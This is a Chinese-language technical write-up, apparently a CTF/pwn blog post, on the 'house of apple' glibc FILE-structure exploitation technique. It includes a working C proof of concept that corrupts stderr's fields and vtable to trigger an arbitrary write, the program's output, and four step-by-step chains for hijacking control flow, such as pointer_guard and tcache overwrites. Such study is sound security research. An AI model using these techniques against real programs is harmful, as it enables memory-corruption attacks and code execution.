
```c
struct _IO_wide_data {
    wchar_t *_IO_read_ptr; /* Current read pointer */
    wchar_t *_IO_read_end; /* End of get area. */
    wchar_t *_IO_read_base; /* Start of putback+get area. */
    wchar_t *_IO_write_base; /* Start of put area. */
    wchar_t *_IO_write_ptr; /* Current put pointer. */
    wchar_t *_IO_write_end; /* End of put area. */
    wchar_t *_IO_buf_base; /* Start of reserve area. */
    wchar_t *_IO_buf_end; /* End of reserve area. */
    /* The following fields are used to support backing up and undo. */
    wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */
    wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */
    wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */
    __mbstate_t _IO_state;
    __mbstate_t _IO_last_state;
    struct _IO_codecvt _codecvt;
    wchar_t _shortbuf[1];
    const struct _IO_jump_t *_wide_vtable;
};
```

换而言之，假如此时在堆上伪造一个`_IO_FILE`结构体并已知其地址为`A`，将`A + 0xd8`替换为`_IO_wstrn_jumps`地址，`A + 0xc0`设置为`B`，并设置其他成员以便能调用到`_IO_OVERFLOW`。`exit`函数则会一路调用到`_IO_wstrn_overflow`函数，并将`B`至`B + 0x38`的地址区域的内容都替换为`A + 0xf0`或者`A + 0x1f0`。

简单写一个`demo`程序进行验证：

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void main()
{
setbuf(stdout, 0);
setbuf(stdin, 0);
setvbuf(stderr, 0, 2, 0);
puts("[*] allocate a 0x100 chunk");
size_t *p1 = malloc(0xf0);
size_t *tmp = p1;
size_t old_value = 0x1122334455667788;
for (size_t i = 0; i < 0x100 / 8; i++)
{
p1[i] = old_value;
}
puts("===========================old value=======================");
for (size_t i = 0; i < 4; i++)
{
printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
tmp += 2;
}
puts("===========================old value=======================");

size_t puts_addr = (size_t)&puts;
printf("[*] puts address: %p\n", (void *)puts_addr);
size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
size_t stderr_flags2_addr = puts_addr + 0x199804;
printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
size_t stderr_wide_data_addr = puts_addr + 0x199830;
printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
size_t sdterr_vtable_addr = puts_addr + 0x199868;
printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);

puts("[+] step 1: change stderr->_IO_write_ptr to -1");
*(size_t *)stderr_write_ptr_addr = (size_t)-1;

puts("[+] step 2: change stderr->_flags2 to 8");
*(size_t *)stderr_flags2_addr = 8;

puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
*(size_t *)stderr_wide_data_addr = (size_t)p1;

puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
*(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;

puts("[+] step 5: call fcloseall and trigger house of apple");
fcloseall();
tmp = p1;
puts("===========================new value=======================");
for (size_t i = 0; i < 4; i++)
{
printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
tmp += 2;
}
puts("===========================new value=======================");
}
```

输出结果如下：

```
roderick@ee8b10ad26b9:/hack$ gcc demo.c -o demo -g -w && ./demo
[*] allocate a 0x100 chunk
===========================old value=======================
[0x55cfb956d2a0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2b0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2c0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2d0]: 0x1122334455667788  0x1122334455667788
===========================old value=======================
[*] puts address: 0x7f648b8a6ef0
[*] stderr->_IO_write_ptr address: 0x7f648ba406a8
[*] stderr->_flags2 address: 0x7f648ba406f4
[*] stderr->_wide_data address: 0x7f648ba40720
[*] stderr->vtable address: 0x7f648ba40758
[*] _IO_wstrn_jumps address: 0x7f648ba3bdc0
[+] step 1: change stderr->_IO_write_ptr to -1
[+] step 2: change stderr->_flags2 to 8
[+] step 3: replace stderr->_wide_data with the allocated chunk
[+] step 4: replace stderr->vtable with _IO_wstrn_jumps
[+] step 5: call fcloseall and trigger house of apple
===========================new value=======================
[0x55cfb956d2a0]: 0x00007f648ba40770  0x00007f648ba40870
[0x55cfb956d2b0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2c0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2d0]: 0x00007f648ba40770  0x00007f648ba40870
===========================new value=======================
```

从输出中可以看到，已经成功修改了`sdterr->_wide_data`所指向的地址空间的内存。

## 利用思路

从上面的分析可以，在只给了`1`次`largebin attack`的前提下，能利用`_IO_wstrn_overflow`函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当我们伪造两个甚至多个`_IO_FILE`结构体，并将这些结构体通过`chain`字段串联起来就能进行组合利用。基于此，我总结了`house of apple`下至少四种利用思路。

### 思路一：修改`tcache`线程变量

该思路需要借助`house of pig`的思想，利用`_IO_str_overflow`中的`malloc`进行任意地址分配，`memcpy`进行任意地址覆盖。其代码片段如下：

```c
int _IO_str_overflow(FILE *fp, int c)
{
    // ......
    char *new_buf;
    char *old_buf = fp->_IO_buf_base;
    // 赋值为old_buf
    size_t old_blen = _IO_blen(fp);
    size_t new_size = 2 * old_blen + 100;
    if (new_size < old_blen)
        return EOF;
    new_buf = malloc(new_size);
    // 这里任意地址分配
    if (new_buf == NULL)
    {
        /*      __ferror(fp) = 1; */
        return EOF;
    }
    if (old_buf)
    {
        memcpy(new_buf, old_buf, old_blen);
        // 劫持_IO_buf_base后即可任意地址写任意值
        free(old_buf);
        // .......
    }
}
```

利用步骤如下：
- 伪造至少两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`tcache`全局变量为已知值，也就控制了`tcache bin`的分配
- 第二个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_str_overflow`中的`malloc`函数任意地址分配，并使用`memcpy`使得能够任意地址写任意值
- 利用两次任意地址写任意值修改`pointer_guard`和`IO_accept_foreign_vtables`的值绕过`_IO_vtable_check`函数的检测（或者利用一次任意地址写任意值修改`libc.got`里面的函数地址，很多`IO`流函数调用`strlen`/`strcpy`/`memcpy`/`memset`等都会调到`libc.got`里面的函数）
- 利用一个`_IO_FILE`，随意伪造`vtable`劫持程序控制流即可

因为可以已经任意地址写任意值了，所以这可以控制的变量和结构体非常多，也非常地灵活，需要结合具体的题目进行利用，比如题目中`_IO_xxx_jumps`映射的地址空间可写的话直接修改其函数指针即可。

### 思路二：修改`mp_`结构体

该思路与上述思路差不多，不过对`tcachebin`分配的劫持是通过修改`mp_.tcache_bins`这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为线程全局变量、`tls`结构体的地址本地和远程并不一定是一样的，有时需要爆破。

利用步骤如下：
- 伪造至少两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`mp_.tcache_bins`为很大的值，使得很大的`chunk`也通过`tcachebin`去管理
- 接下来的过程与上面的思路是一样的

### 思路三：修改`pointer_guard`线程变量之`house of emma`

该思路其实就是`house of apple + house of emma`。

利用步骤如下：
- 伪造两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`tls`结构体`pointer_guard`的值为已知值
- 第二个`_IO_FILE`结构体用来做`house of emma`利用即可控制程序执行流

### 思路四：修改`global_max_fast`全局变量

这个思路也很灵活，修改掉这个变量后，直接释放超大的`chunk`，去覆盖掉`point_guard`或者`tcache`变量。我称之为`house of apple + house of corrision`。

利用过程与前面也基本是大同小异，就不在此详述了。
